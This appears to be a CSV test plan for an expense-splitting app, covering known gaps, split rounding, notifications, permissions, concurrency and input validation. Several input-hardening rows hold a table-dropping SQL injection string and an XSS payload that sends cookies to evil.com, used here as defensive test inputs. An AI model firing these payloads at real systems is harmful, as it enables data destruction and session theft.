TC-GAP-005,Known Gap - Line Item Cap (Q2),Boundary,Medium,None,"1. Upload a receipt for OCR with exactly 100 line items (the doc's own suggested cap)
2. Upload a second receipt with 101 line items",100 vs 101 line items,"UNVERIFIED — per Question Log Q2, no cap is currently enforced; this pair of tests establishes the CURRENT boundary behavior (both likely succeed today) and should be re-run once a max-100 DTO validation rule is added per the doc's own recommended action, to confirm 100 passes and 101 is rejected with 400.",Section 11 Question Log Q2,Boundary pair specifically anchored to the doc's own recommended cap of 100
TC-GAP-006,Known Gap - Dispute After Confirm (Q1),State-Sequence,Critical,"Settlement fully confirmed, ledger posted (SETTLEMENT_POSTED event exists)","1. Payee attempts POST .../dispute strictly after confirmation, then (in a second run) attempt it within 1 minute of confirmation, then again after 30 days",Dispute timing: immediately-after vs. 30-days-after confirmation,"UNVERIFIED — this is Question Log Q1 verbatim ('Should partial settlements allow dispute after receiver confirmation?'); no dispute WINDOW is documented at all; these three timing variants should all be run once product policy is confirmed with dev, to validate whichever window (if any) is implemented.",Section 11 Question Log Q1,Directly from source doc's open Question Log; time-boundary variants of the same open question
TC-GAP-007,Known Gap - FX Fallback (Q3),Negative,High,FX_PROVIDER_DRIVER=frankfurter; simulate api.frankfurter.dev returning a 503 or timing out,"1. Attempt an FX rate sync job run while the Frankfurter API is down
2. Attempt a NEW cross-currency expense creation during the same outage window",FX provider outage during sync job AND during live expense creation,"UNVERIFIED — per Question Log Q3, doc explicitly says this scenario is unresolved and recommends 'a local static exchange rate fallback table'; test both the background sync job's failure handling and the live expense-creation path's failure handling separately, since they may behave differently; confirm both with dev.",Section 11 Question Log Q3,Directly from source doc's open Question Log; split into sync-job vs. live-request sub-cases
TC-GAP-008,Cross-Cutting - All Three Gaps Combined,Cross-Feature,High,A recurring USD expense (Gap #2 relevant) is configured for a ghost participant (Gap #3 relevant) with a totalAmountMinor near MAX_SAFE_INTEGER (Gap #1 relevant) — an intentionally adversarial combination,"1. Configure this combined scenario and let 2 recurring occurrences generate, then have the ghost participant's phone claimed mid-way, then edit one occurrence after an FX rate change",All 3 documented known-gaps combined in one adversarial flow,"UNVERIFIED — this composite scenario is not addressed anywhere in the source document; it is included specifically to stress-test the intersection of all three flagged risk areas simultaneously, since real-world usage could plausibly combine them; requires dedicated design/QA discussion with dev before a precise expected result can be written.","Section 10 Gaps #1, #2, #3 combined","Highest-value composite known-gap case — recommend running LAST, after each gap is individually resolved and re-tested"
TC-CROSS-001,Cross-Feature,Integration,Critical,Recurring monthly USD expense in an INR-default group; group has simplifyDebtsEnabled=true; one prior occurrence already partially settled,"1. Let a new recurring occurrence generate (captures fresh FxRateSnapshotEntity)
2. Partially settle it via a settlement intent for half the amount, confirmed
3. GET /v1/groups/:id/settlements/suggestions to run debt simplification across the group","Recurring + FX + partial settlement + simplify-debts, all combined (as suggested by the assignment's own example)","GreedySettlementOptimizer must operate on the CURRENT net balances (i.e. AFTER the partial settlement is netted out and the new recurring occurrence's postings are included, all in the correct currency groupings) — verify the suggested transfer amount reflects (recurring occurrence total − partial settlement already paid), not the original unadjusted amount.",Section 3.4 GreedySettlementOptimizer; Section 2 Recurring Expenses; Section 10 Gap #2,Explicit multi-feature combination per assignment's own worked example
TC-CROSS-002,Cross-Feature,Integration,High,"Itemized expense with OCR-extracted line items, one item assigned to a ghost participant","1. Upload receipt, let OCR extract items
2. Assign one line item to a ghost participant (not yet claimed)
3. Ghost is claimed by a real user
4. Edit the expense afterward",Itemized + OCR + ghost-claim + edit combined,"Post-claim, the edited expense's line-item assignment correctly resolves to the now-real user; the edit's reversal-and-repost cycle applies to the CURRENT (post-claim) ParticipantEntity, not a stale ghost reference.",Section 10 Gap #3; Section 3.3 Itemized Split; Section 5 PUT /v1/expenses/:id,
TC-CROSS-003,Cross-Feature,Integration,High,Group with a recurring expense AND an active import of historical Splitwise data covering an overlapping date range,1. Import a Splitwise CSV containing expenses that date-overlap with already-generated recurring occurrences,Import overlapping recurring-generated data,UNVERIFIED — doc doesn't address deduplication between imported historical data and system-generated recurring occurrences; expected risk of duplicate expenses covering the same real-world transaction; confirm de-dup strategy with dev.,Section 2 Import/Export; Section 2 Recurring Expenses,Cross-feature interaction gap: import vs. recurring overlap/dedup
TC-CROSS-004,Cross-Feature,Integration,Medium,"Offline-queued expense creation (mobile) for a group where, in the meantime, an admin (online) changed the split-relevant member roles","1. Queue an expense offline naming a specific set of participants
2. While offline, an admin removes one of those participants from the group online
3. Reconnect and push the offline queue",Offline expense creation + concurrent online membership change,UNVERIFIED — doc doesn't specify how offline-sync push handles a referenced participant that's no longer valid by the time of sync; expected 409/partial-failure with a clear conflict surfaced to the client rather than silent data corruption; confirm with dev.,Section 9 Offline Sync; Section 4.2 GroupMembershipEntity,Cross-feature interaction gap: offline sync vs. membership changes
TC-CROSS-005,Cross-Feature,Integration,Medium,Payment-gateway-driven settlement (Cashfree) confirmed via webhook while the SAME settlement also has push notifications configured,"1. Complete a gateway-driven settlement via webhook
2. Verify the payee receives a push/email notification just as they would for a manually-confirmed settlement",Gateway webhook confirm + notification firing,Notification dispatch must be triggered from the SAME SETTLEMENT_POSTED domain event regardless of whether confirmation came from a webhook or a manual API call — payee is notified either way.,Section 2 Payment Gateways; Section 2 Push Notifications & Emails,
TC-CROSS-006,Cross-Feature,Integration,Medium,Admin voids an expense that was part of a debt-simplification suggestion the user was about to act on,"1. GET settlement suggestions (includes a suggestion derived partly from Expense X)
2. Admin voids Expense X before the user acts on the suggestion
3. User attempts to create a settlement intent based on the now-stale suggested amount",Suggestion staleness after concurrent void,"The settlement intent creation should validate against CURRENT balances at intent-creation time (not the client's possibly-stale cached suggestion amount) — if the amount no longer matches outstanding debt, the system should reject or adjust rather than posting an over/under payment.",Section 3.4 GreedySettlementOptimizer; Section 5 DELETE /v1/expenses/:id,
TC-CROSS-007,Cross-Feature,Integration,Low,User with an ITEMIZED expense receipt attachment exports the group ledger to PDF,1. Export a group's ledger to PDF where one expense has an itemized breakdown with an attached receipt image,Itemized expense + export combined,"UNVERIFIED — doc doesn't state whether the PDF export includes itemized line-item detail or just expense-level totals, and whether receipt images are embedded or just referenced; confirm expected PDF content scope with dev.",Section 2 Import/Export; Section 3.3 Itemized Split,
TC-AUTH-033,Auth - Twilio Live Driver,Happy Path,High,OTP_PROVIDER_DRIVER=twilio_verify; TWILIO_ACCOUNT_SID/TWILIO_AUTH_TOKEN/TWILIO_VERIFY_SERVICE_SID configured,"1. POST /v1/auth/request-otp with a real phone number in a staging environment with live Twilio Verify
2. Receive the real SMS code and verify it",Live Twilio Verify flow,"200: OTP sent via Twilio Verify API (not the dev bypass); verify-otp succeeds only with the actual code delivered, NOT with OTP_DEV_CODE, since ALLOW_INSECURE_DEV_PROVIDERS should be false alongside a live driver.","Section 1 env vars TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN, TWILIO_VERIFY_SERVICE_SID",
TC-AUTH-034,Auth - Missing Twilio Config,Negative,High,OTP_PROVIDER_DRIVER=twilio_verify but TWILIO_ACCOUNT_SID is unset,1. Start the API with this inconsistent config and attempt POST /v1/auth/request-otp,"Misconfigured live driver, missing credentials",UNVERIFIED — doc doesn't state whether this is caught at Zod startup validation (cross-field dependency) or fails at request time; expected ideally a startup failure rather than a runtime 500 on first use; confirm with dev.,Section 1 env vars - cross-field validation gap,Known gap: no documented cross-field env validation (driver selection vs. required credentials for that driver)
TC-AUTH-035,Auth - Multiple Identities Same User,Boundary,Medium,User previously registered via phone OTP; later signs in with Google using an email that matches their profile email,"1. Register via phone OTP first
2. Later, sign in via Google OAuth using an email added to the same profile","Same user, two AuthIdentityEntity providers",UNVERIFIED — doc doesn't specify automatic account-linking behavior (same UserEntity vs. a NEW separate user for the Google identity); expected ideally to link both AuthIdentityEntity rows to ONE UserEntity if email/phone matches; confirm linking rules with dev.,Section 4.1 AuthIdentityEntity - multiple providers per user,Known gap: cross-provider account linking rules undocumented
TC-AUTH-036,Auth - Refresh Session Device Info,Happy Path,Low,User logs in from a new device,1. Complete login and inspect the resulting RefreshSessionEntity.deviceInfo field,New device login,"deviceInfo captures identifying device/user-agent metadata for the session, usable later for a 'manage active sessions' feature.",Section 4.1 RefreshSessionEntity.deviceInfo,
TC-AUTH-037,Auth - Contact Sync,Happy Path,Medium,User grants contact-sync permission on mobile with 50 phone contacts,1. POST contact sync with 50 phone numbers,50 contacts synced,"200: ContactAliasEntity rows created/matched for contacts that correspond to existing SplitSaathi users, enabling 'add as friend' suggestions; non-matching contacts are not otherwise persisted with unnecessary PII beyond what's needed for matching.",Section 4.1 ContactAliasEntity,
TC-EXP-027,Expense - Multiple Payers Reconciliation,Negative,High,"Group with A,B,C","1. Create expense totalAmountMinor=10000 with payers A paid=6000, B paid=3000 (sum=9000, short by 1000)",sum(paidAmountMinor)=9000 ≠ totalAmountMinor=10000,"400 Bad Request: sum of ExpensePayerEntity.paidAmountMinor must equal totalAmountMinor, mirroring the exact-split reconciliation rule.",Section 4.3 ExpensePayerEntity; Section 3.5 Balanced Posting Set,
TC-EXP-028,Expense - Self-paid Equal Split,Happy Path,Medium,"Group with A,B,C; A pays for everyone","1. Create expense totalAmountMinor=9000, payer=A only, splitType=equal among A,B,C","Single payer, equal 3-way split","A: paid 9000, owed 3000 → net +6000 (owed to A). B: paid 0, owed 3000 → net -3000. C: paid 0, owed 3000 → net -3000. Ledger sums to 0.",Section 3.5 Balanced Posting Set; Section 3.3 Equal Split,
TC-EXP-029,Expense - Search/Filter,Happy Path,Medium,"Group with 40 expenses across 3 categories: Food, Travel, Utilities",1. GET /v1/groups/:id/expenses?category=Food,category=Food filter,"200: only expenses with category='Food' returned, correctly excluding Travel/Utilities.",Section 5 GET /v1/groups/:id/expenses (filtering inferred from category field),
TC-EXP-030,Expense - Date Range Filter,Boundary,Medium,Group with expenses spanning Jan-Dec 2026,1. GET /v1/groups/:id/expenses?fromDate=2026-06-01&toDate=2026-06-30,June 2026 date range,200: only expenses with expenseDate within June 2026 (inclusive boundaries) returned.,Section 5 GET /v1/groups/:id/expenses,
TC-EXP-031,Expense - Voided Excluded from Balance,Happy Path,Critical,Expense of ₹1000 created and then voided,"1. Void the expense
2. GET /v1/groups/:id and inspect net balance summary",Voided expense,The voided expense's amount is fully excluded from GroupBalanceProjectionEntity.netBalanceMinor — balances reflect only 'active' status expenses.,Section 4.3 ExpenseProjectionEntity.status - active|voided,
TC-EXP-032,Expense - Voided Still Visible in History,Happy Path,Medium,Expense voided,"1. GET /v1/groups/:id/expenses including voided ones (e.g. ?includeVoided=true if supported, or default listing)",Voided expense visibility,UNVERIFIED — doc doesn't specify whether voided expenses remain visible in the default list (crossed-out) or are hidden by default and require an explicit filter; confirm UI/API contract with dev.,Section 4.3 ExpenseProjectionEntity.status,
TC-SPLIT-EQ-015,Equal Split - Member Count Sweep,Boundary,High,Group with exactly 2 members,"1. Create expense totalAmountMinor=100037, splitType=equal, participants=list of 2 ids","N=2 participants, totalAmountMinor=100037 (₹1000.37)","Allocation: usr_m1=₹500.19, usr_m0=₹500.18. Sum=₹1000.37 (must equal total ₹1000.37). Currency=INR.",Section 3.2 RoundingAllocator; methodology requires member-count boundary sweep (2/3/5/10/50),
TC-SPLIT-EQ-016,Equal Split - Member Count Sweep,Boundary,Medium,Group with exactly 3 members,"1. Create expense totalAmountMinor=100037, splitType=equal, participants=list of 3 ids","N=3 participants, totalAmountMinor=100037 (₹1000.37)","Allocation: usr_m1=₹333.46, usr_m0=₹333.46, usr_m2=₹333.45. Sum=₹1000.37 (must equal total ₹1000.37). Currency=INR.",Section 3.2 RoundingAllocator; methodology requires member-count boundary sweep (2/3/5/10/50),
TC-SPLIT-EQ-017,Equal Split - Member Count Sweep,Boundary,Medium,Group with exactly 5 members,"1. Create expense totalAmountMinor=100037, splitType=equal, participants=list of 5 ids","N=5 participants, totalAmountMinor=100037 (₹1000.37)","Allocation: usr_m4=₹200.08, usr_m1=₹200.08, usr_m0=₹200.07, usr_m3=₹200.07, usr_m2=₹200.07. Sum=₹1000.37 (must equal total ₹1000.37). Currency=INR.",Section 3.2 RoundingAllocator; methodology requires member-count boundary sweep (2/3/5/10/50),
TC-SPLIT-EQ-018,Equal Split - Member Count Sweep,Boundary,Medium,Group with exactly 10 members,"1. Create expense totalAmountMinor=100037, splitType=equal, participants=list of 10 ids","N=10 participants, totalAmountMinor=100037 (₹1000.37)","Allocation: usr_m5=₹100.04, usr_m4=₹100.04, usr_m7=₹100.04, usr_m6=₹100.04, usr_m1=₹100.04, usr_m0=₹100.04, usr_m3=₹100.04, usr_m2=₹100.03, usr_m9=₹100.03, usr_m8=₹100.03. Sum=₹1000.37 (must equal total ₹1000.37). Currency=INR.",Section 3.2 RoundingAllocator; methodology requires member-count boundary sweep (2/3/5/10/50),
TC-SPLIT-EQ-019,Equal Split - Member Count Sweep,Boundary,High,Group with exactly 50 members,"1. Create expense totalAmountMinor=100037, splitType=equal, participants=list of 50 ids","N=50 participants, totalAmountMinor=100037 (₹1000.37)","Allocation: usr_m18=₹20.01, usr_m19=₹20.01, usr_m14=₹20.01, usr_m15=₹20.01, usr_m16=₹20.01, usr_m17=₹20.01, usr_m10=₹20.01, usr_m11=₹20.01, usr_m12=₹20.01, usr_m13=₹20.01, usr_m5=₹20.01, usr_m4=₹20.01, usr_m7=₹20.01, usr_m6=₹20.01, usr_m1=₹20.01, usr_m0=₹20.01, usr_m32=₹20.01, usr_m3=₹20.01, usr_m43=₹20.01, usr_m33=₹20.01, usr_m2=₹20.01, usr_m42=₹20.01, usr_m30=₹20.01, usr_m41=₹20.01, usr_m31=₹20.01, usr_m25=₹20.01, usr_m40=₹20.01, usr_m36=₹20.01, usr_m24=₹20.01, usr_m47=₹20.01, usr_m37=₹20.01, usr_m27=₹20.01, usr_m46=₹20.01, usr_m34=₹20.01, usr_m26=₹20.01, usr_m9=₹20.01, usr_m45=₹20.01, usr_m35=₹20.00, usr_m21=₹20.00, usr_m8=₹20.00, usr_m44=₹20.00, usr_m20=₹20.00, usr_m23=₹20.00, usr_m38=₹20.00, usr_m22=₹20.00, usr_m49=₹20.00, usr_m39=₹20.00, usr_m48=₹20.00, usr_m29=₹20.00, usr_m28=₹20.00. Sum=₹1000.37 (must equal total ₹1000.37). Currency=INR.",Section 3.2 RoundingAllocator; methodology requires member-count boundary sweep (2/3/5/10/50),
TC-SPLIT-WT-009,Weighted Split - Member Count Sweep,Boundary,Medium,"Group with 2 members, increasing weights 1..2","1. Create expense totalAmountMinor=500050, splitType=weight, weights={id: rank for rank 1..2}","N=2, weights=1..2, totalAmountMinor=500050 (₹5000.50)","Allocation: usr_w1=₹3333.67, usr_w0=₹1666.83. Sum=₹5000.50 (must equal total ₹5000.50). Currency=INR.",Section 3.3 WeightedShareSplitStrategy; methodology requires member-count boundary sweep,
TC-SPLIT-WT-010,Weighted Split - Member Count Sweep,Boundary,Medium,"Group with 3 members, increasing weights 1..3","1. Create expense totalAmountMinor=500050, splitType=weight, weights={id: rank for rank 1..3}","N=3, weights=1..3, totalAmountMinor=500050 (₹5000.50)","Allocation: usr_w0=₹833.42, usr_w1=₹1666.83, usr_w2=₹2500.25. Sum=₹5000.50 (must equal total ₹5000.50). Currency=INR.",Section 3.3 WeightedShareSplitStrategy; methodology requires member-count boundary sweep,
TC-SPLIT-WT-011,Weighted Split - Member Count Sweep,Boundary,Medium,"Group with 5 members, increasing weights 1..5","1. Create expense totalAmountMinor=500050, splitType=weight, weights={id: rank for rank 1..5}","N=5, weights=1..5, totalAmountMinor=500050 (₹5000.50)","Allocation: usr_w3=₹1333.47, usr_w0=₹333.37, usr_w4=₹1666.83, usr_w1=₹666.73, usr_w2=₹1000.10. Sum=₹5000.50 (must equal total ₹5000.50). Currency=INR.",Section 3.3 WeightedShareSplitStrategy; methodology requires member-count boundary sweep,
TC-SPLIT-WT-012,Weighted Split - Member Count Sweep,Boundary,Medium,"Group with 10 members, increasing weights 1..10","1. Create expense totalAmountMinor=500050, splitType=weight, weights={id: rank for rank 1..10}","N=10, weights=1..10, totalAmountMinor=500050 (₹5000.50)","Allocation: usr_w5=₹545.51, usr_w0=₹90.92, usr_w6=₹636.43, usr_w1=₹181.84, usr_w7=₹727.35, usr_w2=₹272.75, usr_w8=₹818.26, usr_w3=₹363.67, usr_w9=₹909.18, usr_w4=₹454.59. Sum=₹5000.50 (must equal total ₹5000.50). Currency=INR.",Section 3.3 WeightedShareSplitStrategy; methodology requires member-count boundary sweep,
TC-NOTIF-009,Notification Trigger - Expense created (you're a participant),Notification,High,User has valid DeviceInstallationEntity (for push) and/or verified email (for email) as applicable to channel(s): push+email,"1. Trigger the domain event: 'Expense created (you're a participant)'
2. Observe notification dispatch across configured channel(s)","Event=Expense created (you're a participant), expected channel(s)=push+email","Notification is sent via push+email to the correct affected user(s) only, with content referencing the specific event (not generic); users NOT affected by this event receive no notification for it.",Section 2 Push Notifications & Emails; Section 6 Integrations #4,
TC-NOTIF-010,Notification Trigger - Expense edited (amount changed),Notification,Medium,User has valid DeviceInstallationEntity (for push) and/or verified email (for email) as applicable to channel(s): push,"1. Trigger the domain event: 'Expense edited (amount changed)'
2. Observe notification dispatch across configured channel(s)","Event=Expense edited (amount changed), expected channel(s)=push","Notification is sent via push to the correct affected user(s) only, with content referencing the specific event (not generic); users NOT affected by this event receive no notification for it.",Section 2 Push Notifications & Emails; Section 6 Integrations #4,
TC-NOTIF-011,Notification Trigger - Expense voided,Notification,Medium,User has valid DeviceInstallationEntity (for push) and/or verified email (for email) as applicable to channel(s): push,"1. Trigger the domain event: 'Expense voided'
2. Observe notification dispatch across configured channel(s)","Event=Expense voided, expected channel(s)=push","Notification is sent via push to the correct affected user(s) only, with content referencing the specific event (not generic); users NOT affected by this event receive no notification for it.",Section 2 Push Notifications & Emails; Section 6 Integrations #4,
TC-NOTIF-012,Notification Trigger - Added to a group,Notification,High,User has valid DeviceInstallationEntity (for push) and/or verified email (for email) as applicable to channel(s): push+email,"1. Trigger the domain event: 'Added to a group'
2. Observe notification dispatch across configured channel(s)","Event=Added to a group, expected channel(s)=push+email","Notification is sent via push+email to the correct affected user(s) only, with content referencing the specific event (not generic); users NOT affected by this event receive no notification for it.",Section 2 Push Notifications & Emails; Section 6 Integrations #4,
TC-NOTIF-013,Notification Trigger - Removed from a group,Notification,Medium,User has valid DeviceInstallationEntity (for push) and/or verified email (for email) as applicable to channel(s): push,"1. Trigger the domain event: 'Removed from a group'
2. Observe notification dispatch across configured channel(s)","Event=Removed from a group, expected channel(s)=push","Notification is sent via push to the correct affected user(s) only, with content referencing the specific event (not generic); users NOT affected by this event receive no notification for it.",Section 2 Push Notifications & Emails; Section 6 Integrations #4,
TC-NOTIF-014,Notification Trigger - Settlement request created (you're the payer),Notification,High,User has valid DeviceInstallationEntity (for push) and/or verified email (for email) as applicable to channel(s): push,"1. Trigger the domain event: 'Settlement request created (you're the payer)'
2. Observe notification dispatch across configured channel(s)","Event=Settlement request created (you're the payer), expected channel(s)=push","Notification is sent via push to the correct affected user(s) only, with content referencing the specific event (not generic); users NOT affected by this event receive no notification for it.",Section 2 Push Notifications & Emails; Section 6 Integrations #4,
TC-NOTIF-015,Notification Trigger - Settlement proof submitted (you're the payee),Notification,High,User has valid DeviceInstallationEntity (for push) and/or verified email (for email) as applicable to channel(s): push,"1. Trigger the domain event: 'Settlement proof submitted (you're the payee)'
2. Observe notification dispatch across configured channel(s)","Event=Settlement proof submitted (you're the payee), expected channel(s)=push","Notification is sent via push to the correct affected user(s) only, with content referencing the specific event (not generic); users NOT affected by this event receive no notification for it.",Section 2 Push Notifications & Emails; Section 6 Integrations #4,
TC-NOTIF-016,Notification Trigger - Settlement confirmed (you're the payer),Notification,High,User has valid DeviceInstallationEntity (for push) and/or verified email (for email) as applicable to channel(s): push+email,"1. Trigger the domain event: 'Settlement confirmed (you're the payer)'
2. Observe notification dispatch across configured channel(s)","Event=Settlement confirmed (you're the payer), expected channel(s)=push+email","Notification is sent via push+email to the correct affected user(s) only, with content referencing the specific event (not generic); users NOT affected by this event receive no notification for it.",Section 2 Push Notifications & Emails; Section 6 Integrations #4,
TC-NOTIF-017,Notification Trigger - Settlement disputed,Notification,Critical,User has valid DeviceInstallationEntity (for push) and/or verified email (for email) as applicable to channel(s): push+email,"1. Trigger the domain event: 'Settlement disputed'
2. Observe notification dispatch across configured channel(s)","Event=Settlement disputed, expected channel(s)=push+email","Notification is sent via push+email to the correct affected user(s) only, with content referencing the specific event (not generic); users NOT affected by this event receive no notification for it.",Section 2 Push Notifications & Emails; Section 6 Integrations #4,
TC-NOTIF-018,Notification Trigger - Recurring expense generated,Notification,Medium,User has valid DeviceInstallationEntity (for push) and/or verified email (for email) as applicable to channel(s): push,"1. Trigger the domain event: 'Recurring expense generated'
2. Observe notification dispatch across configured channel(s)","Event=Recurring expense generated, expected channel(s)=push","Notification is sent via push to the correct affected user(s) only, with content referencing the specific event (not generic); users NOT affected by this event receive no notification for it.",Section 2 Push Notifications & Emails; Section 6 Integrations #4,
TC-NOTIF-019,Notification Trigger - Comment added to an expense you're part of,Notification,Low,User has valid DeviceInstallationEntity (for push) and/or verified email (for email) as applicable to channel(s): push,"1. Trigger the domain event: 'Comment added to an expense you're part of'
2. Observe notification dispatch across configured channel(s)","Event=Comment added to an expense you're part of, expected channel(s)=push","Notification is sent via push to the correct affected user(s) only, with content referencing the specific event (not generic); users NOT affected by this event receive no notification for it.",Section 2 Push Notifications & Emails; Section 6 Integrations #4,
TC-NOTIF-020,Notification Trigger - Monthly summary ready,Notification,Low,User has valid DeviceInstallationEntity (for push) and/or verified email (for email) as applicable to channel(s): email,"1. Trigger the domain event: 'Monthly summary ready'
2. Observe notification dispatch across configured channel(s)","Event=Monthly summary ready, expected channel(s)=email","Notification is sent via email to the correct affected user(s) only, with content referencing the specific event (not generic); users NOT affected by this event receive no notification for it.",Section 2 Push Notifications & Emails; Section 6 Integrations #4,
TC-VALID-047,Input Hardening - Group description,Negative,Critical,Endpoint POST /v1/groups reachable with a valid authenticated actor.,"1. Submit the request to POST /v1/groups with description=""'; DROP TABLE expense_projections;--""",description='; DROP TABLE expense_projections;--,TypeORM parameterized queries prevent execution; table remains intact; value stored/rejected as literal text or 400 on length/format rules.,Section 8 DTO Input Validation,
TC-VALID-048,Input Hardening - Group description,Negative,Medium,Endpoint POST /v1/groups reachable with a valid authenticated actor.,"1. Submit the request to POST /v1/groups with description=""'; return true; var x='""",description='; return true; var x=',Value is treated as an inert string; no query logic is altered since TypeORM/Postgres is not vulnerable to JS injection.,Section 8 DTO Input Validation,
TC-VALID-049,Input Hardening - Group description,Negative,Critical,Endpoint POST /v1/groups reachable with a valid authenticated actor.,"1. Submit the request to POST /v1/groups with description=""<script>document.location='http://evil.com/'+document.cookie</script>""",description=<script>document.location='http://evil.com/'+document.cookie</script>,Value is stored/rejected as literal text; API response never causes this to execute in any client context (verify no unescaped reflection).,Section 8 DTO Input Validation,
TC-VALID-050,Input Hardening - Group description,Negative,Medium,Endpoint POST /v1/groups reachable with a valid authenticated actor.,"1. Submit the request to POST /v1/groups with description=""'Z' * 50000""",description='Z' * 50000,"UNVERIFIED — undocumented max length for this field; expect 400 if a cap exists, confirm with dev.",Section 8 DTO Input Validation,Undocumented field-length/encoding policy
TC-VALID-051,Input Hardening - Group description,Negative,Medium,Endpoint POST /v1/groups reachable with a valid authenticated actor.,"1. Submit the request to POST /v1/groups with description=""'🎉💰₹ पैसा 日本語'""",description='🎉💰₹ पैसा 日本語',"Stored and returned unchanged, UTF-8 safe, no mojibake or truncation mid-codepoint.",Section 8 DTO Input Validation,
TC-VALID-052,Input Hardening - Group description,Negative,Medium,Endpoint POST /v1/groups reachable with a valid authenticated actor.,"1. Submit the request to POST /v1/groups with description=""'valid-looking\\u0000hidden'""",description='valid-looking\u0000hidden',UNVERIFIED — undocumented null-byte handling; expect rejection or safe truncation at the null byte; confirm with dev.,Section 8 DTO Input Validation,Undocumented field-length/encoding policy
TC-VALID-053,Input Hardening - Recurring expense note,Negative,Critical,Endpoint POST recurring expense config reachable with a valid authenticated actor.,"1. Submit the request to POST recurring expense config with note=""'; DROP TABLE expense_projections;--""",note='; DROP TABLE expense_projections;--,TypeORM parameterized queries prevent execution; table remains intact; value stored/rejected as literal text or 400 on length/format rules.,Section 8 DTO Input Validation,
TC-VALID-054,Input Hardening - Recurring expense note,Negative,Medium,Endpoint POST recurring expense config reachable with a valid authenticated actor.,"1. Submit the request to POST recurring expense config with note=""'; return true; var x='""",note='; return true; var x=',Value is treated as an inert string; no query logic is altered since TypeORM/Postgres is not vulnerable to JS injection.,Section 8 DTO Input Validation,
TC-VALID-055,Input Hardening - Recurring expense note,Negative,Critical,Endpoint POST recurring expense config reachable with a valid authenticated actor.,"1. Submit the request to POST recurring expense config with note=""<script>document.location='http://evil.com/'+document.cookie</script>""",note=<script>document.location='http://evil.com/'+document.cookie</script>,Value is stored/rejected as literal text; API response never causes this to execute in any client context (verify no unescaped reflection).,Section 8 DTO Input Validation,
TC-VALID-056,Input Hardening - Recurring expense note,Negative,Medium,Endpoint POST recurring expense config reachable with a valid authenticated actor.,"1. Submit the request to POST recurring expense config with note=""'Z' * 50000""",note='Z' * 50000,"UNVERIFIED — undocumented max length for this field; expect 400 if a cap exists, confirm with dev.",Section 8 DTO Input Validation,Undocumented field-length/encoding policy
TC-VALID-057,Input Hardening - Recurring expense note,Negative,Medium,Endpoint POST recurring expense config reachable with a valid authenticated actor.,"1. Submit the request to POST recurring expense config with note=""'🎉💰₹ पैसा 日本語'""",note='🎉💰₹ पैसा 日本語',"Stored and returned unchanged, UTF-8 safe, no mojibake or truncation mid-codepoint.",Section 8 DTO Input Validation,
TC-VALID-058,Input Hardening - Recurring expense note,Negative,Medium,Endpoint POST recurring expense config reachable with a valid authenticated actor.,"1. Submit the request to POST recurring expense config with note=""'valid-looking\\u0000hidden'""",note='valid-looking\u0000hidden',UNVERIFIED — undocumented null-byte handling; expect rejection or safe truncation at the null byte; confirm with dev.,Section 8 DTO Input Validation,Undocumented field-length/encoding policy
TC-PERM-040,Permissions - Viewer read-only,Permission,High,Group with a Viewer-role user V,"1. V calls GET /v1/groups/:id (read)
2. V calls GET /v1/groups/:id/expenses (read)
3. V calls GET /v1/groups/:id/settlements/suggestions (read)","Actor=Viewer, all GET/read endpoints","200 for all three: Viewer role is not listed as denied for any documented read (GET) endpoint in the Authorization Matrix — read access is implicitly available to all group members including Viewer, only WRITE actions are restricted.","Section 7 Authorization Matrix (read endpoints not explicitly listed, inferred allowed for all members)",
TC-PERM-041,Permissions - Settlement dispute (undocumented role),Permission,Medium,Settlement intent exists between A(payer) and B(payee) in a group with admin C,"1. C (group admin, not payer or payee) attempts POST .../dispute","Actor=admin C, not party to the settlement","UNVERIFIED — the Authorization Matrix table doesn't list a specific role requirement for the dispute action (endpoint doc just says 'Access JWT'), unlike confirm ('Payee/Admin'); expected any authenticated group member (or specifically payer/payee) can dispute, but exact scope is unconfirmed; confirm with dev.",Section 5 POST /v1/settlements/intents/:id/dispute - 'Access JWT' (broader than confirm's scoped auth),Known gap: dispute action's authorization scope less precisely documented than confirm's
TC-PERM-042,Permissions - Friend relationship access,Permission,Medium,A and B are friends (direct ledger); C is unrelated (not a friend of either),1. C attempts to GET the direct ledger/expense list between A and B by guessing/enumerating an ID,"Actor=C, unrelated third party",403/404: pairwise friend ledgers must be strictly scoped to the two participants; no third party can view them regardless of role elsewhere in the system.,Section 2 Friends & 1-on-1 Ledgers,
TC-PERM-043,Permissions - Export scoped to group,Permission,High,User is Admin in Group G1 (export ✅) but only Member in Group G2 (export ❌),"1. Using the SAME user session, call export on G1 (should succeed)
2. Call export on G2 (should fail)","Same user, different roles in different groups","G1 export succeeds (200); G2 export fails (403) — confirms permissions are evaluated per-group from the correct GroupMembershipEntity, not cached globally per user.",Section 4.2 GroupMembershipEntity - per-group role scoping,
TC-CONC-008,Concurrency - Concurrent Group Role Changes,Concurrency,Medium,Owner A and a second owner-equivalent admin B (hypothetically) both attempt role changes on member C simultaneously,"1. Fire two simultaneous role-change requests for C: one setting role=admin, another setting role=viewer",Conflicting simultaneous role changes,"UNVERIFIED — doc doesn't specify last-write-wins vs. locking for GroupMembershipEntity.role updates; expected one request 'wins' deterministically per DB transaction ordering, with the final role being whichever committed last; confirm with dev.",Section 4.2 GroupMembershipEntity.role,Concurrency gap: role-change race condition
TC-CONC-009,Concurrency - Concurrent Attachment Upload,Concurrency,Low,Two users on the same expense both attempt to attach a receipt at the same time,1. A and B simultaneously upload different receipt images to the same expense,Parallel attachment uploads,Both attachments are stored successfully as separate records linked to the expense; no overwrite/collision occurs (each has a unique attachmentId).,"Section 4.3 (attachments relationship, inferred multi-attachment support)",
TC-CONC-010,Concurrency - Idempotency Key Collision Across Users,Negative,Medium,Two DIFFERENT users happen to generate the same x-idempotency-key value (e.g. a buggy client using a non-unique key scheme),"1. User A POSTs an expense with x-idempotency-key='dup-key-001'
2. User B (different session/account) POSTs a DIFFERENT expense also with x-idempotency-key='dup-key-001'","Same idempotency key, different users",UNVERIFIED — doc doesn't state whether IdempotencyRecordEntity keys are scoped per-user or globally; expected keys should be scoped per-user (or per-user+route) so B's request is NOT short-circuited into returning A's expense; confirm scoping with dev.,Section 8 Idempotency Control - IdempotencyRecordEntity,Security/correctness gap: idempotency key scoping not documented
TC-ATTACH-008,Attachments,Boundary,Low,Object storage configured,1. Upload a receipt image with an unusual but valid extension (.HEIC from an iPhone),.HEIC image format,UNVERIFIED — doc doesn't list supported image formats explicitly; expected common formats (jpg/png/heic/pdf) are accepted; confirm the exact supported MIME whitelist with dev.,Section 2 Expense Attachments & Receipts,
